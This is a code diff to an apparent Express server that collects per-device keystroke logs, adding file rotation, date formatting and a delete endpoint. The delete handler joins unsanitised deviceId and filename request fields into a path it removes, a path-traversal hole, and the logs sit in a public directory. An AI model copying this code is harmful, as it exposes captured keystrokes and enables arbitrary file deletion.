@@ -50,15 +50,53 @@ export const addNewKeyLogs = async (data: any) => {
 			fs.mkdirSync(logsDir, { recursive: true });
 		}
 
-		// Get today's date in YYYY-MM-DD format
+		// Check if the number of files exceeds the limit (100 files)
+		const files = fs
+			.readdirSync(logsDir)
+			.filter((file) => file.endsWith(".txt"));
+		if (files.length >= 100) {
+			// Sort the files by creation time (oldest first)
+			const sortedFiles = files
+				.map((file) => ({
+					file,
+					time: fs.statSync(path.join(logsDir, file)).ctimeMs,
+				}))
+				.sort((a, b) => a.time - b.time);
+
+			// Remove the oldest file
+			const oldestFile = sortedFiles[0].file;
+			fs.unlinkSync(path.join(logsDir, oldestFile));
+			console.log(`Removed oldest file: ${oldestFile}`);
+		}
+
+		// Get today's date in YYYY-MM-DD format for the file name
 		const today = new Date().toISOString().split("T")[0];
 		const filePath = path.join(logsDir, `${today}.txt`);
 
-		// Prepare the log entry
-		const logEntry = `${new Date().toISOString()} - ${keyLogsType}: ${keylogs}, Event: ${event}\n`;
+		// Format the log entry date to MM/DD/YYYY hh:mm:ss
+		const formatDate = (date: Date) => {
+			const options: Intl.DateTimeFormatOptions = {
+				year: "numeric",
+				month: "2-digit",
+				day: "2-digit",
+				hour: "2-digit",
+				minute: "2-digit",
+				second: "2-digit",
+				hour12: false,
+			};
+			return new Intl.DateTimeFormat("en-US", options)
+				.format(date)
+				.replace(",", "");
+		};
+
+		const formattedDate = formatDate(new Date());
+
+		// Prepare the log entry with the formatted date
+		const logEntry = `${formattedDate} - ${keyLogsType}: ${keylogs}, Event: ${event}\n`;
 
 		// Append the log entry to the file
 		fs.appendFileSync(filePath, logEntry);
+		console.log(`Added new key log entry to: ${filePath}`);
 	} catch (error) {
 		console.error("Error adding key logs:", error);
 		return { status: 500, error: "Failed to add key logs" };
@@ -105,5 +143,45 @@ export const getKeyLogsFiles = async (req: Request, res: Response) => {
 	} catch (error) {
 		console.error("Error processing keylogs:", error);
 		res.status(500).json({ error: "Failed to process the keylogs" });
+	}
+};
+
+// Define the base path where keylog files are stored
+export const removeKeyLogs = async (req: Request, res: Response) => {
+	const errors = validationResult(req);
+	if (!errors.isEmpty()) {
+		return res.status(400).json({ errors: errors.array() });
+	}
+
+	const { deviceId, filename } = req.body;
+
+	const keyLogsBasePath = path.join(
+		__dirname,
+		"..",
+		"..",
+		"public",
+		"keylogs"
+	);
+
+	try {
+		// Construct the full path to the keylog file
+		const filePath = path.join(keyLogsBasePath, deviceId, filename);
+
+		// Check if the file exists
+		if (fs.existsSync(filePath)) {
+			// Remove the file
+			fs.unlinkSync(filePath);
+			return res.status(200).json({
+				status: 200,
+				message: `${filename} successfully removed`,
+			});
+		} else {
+			return res
+				.status(404)
+				.json({ status: 404, error: "File not found" });
+		}
+	} catch (error) {
+		console.error("Error removing keylog file:", error);
+		return res.status(500).json({ error: "Failed to remove keylog file" });
 	}
 };
